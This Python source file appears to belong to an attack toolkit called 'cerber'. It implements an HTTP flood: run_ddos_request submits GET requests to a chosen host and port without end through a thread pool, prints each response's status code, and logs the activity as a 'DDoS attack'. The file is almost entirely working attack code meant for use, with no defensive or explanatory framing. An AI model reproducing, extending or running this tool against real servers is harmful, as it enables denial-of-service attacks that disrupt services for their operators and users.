import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

from cerber.ddfu.src.common import header_service
import threading
from print_color import print

from cerber.utils import RequestService, Logger


class DdosRequest(threading.Thread):
    target = ''

    def __init__(self, target: str, port: int = None):
        threading.Thread.__init__(self)
        self.target = target
        self.ssl = False
        self.req = []
        self.lock = threading.Lock()
        self.port = port

    @staticmethod
    def rand_str():
        my_str = []
        for x in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = (random.choice(chars) for _ in range(random.randint(7, 14)))
            text = ''.join(text)
            my_str.append(text)
        return '&'.join(my_str)

    def run(self):
        port = f':{self.port}' if self.port else ''
        url = f'{self.target}{port}'

        try:
            res = RequestService.get(url, {}, header_service.header(url))
            if res.status_code < 300:
                print(url, color='c', tag_color='g', tag=f"{res.status_code}")
            elif 300 < res.status_code < 400:
                print(url, color='w', tag_color='y', tag=f"{res.status_code}")
            else:
                print(url, color='w', tag_color='r', tag=f"{res.status_code}")

        except Exception as e:
            Logger.error(e)


def run_ddos_request(host: str, port: int, user_thread: int):
    with ThreadPoolExecutor(max_workers=user_thread) as executor:
        try:
            while True:
                executor.submit(DdosRequest(target=host, port=port).run)
                time.sleep(0.1)  # Задержка между запросами
        except KeyboardInterrupt:
            Logger.info("DDoS attack stopped by user.")
            exit(101)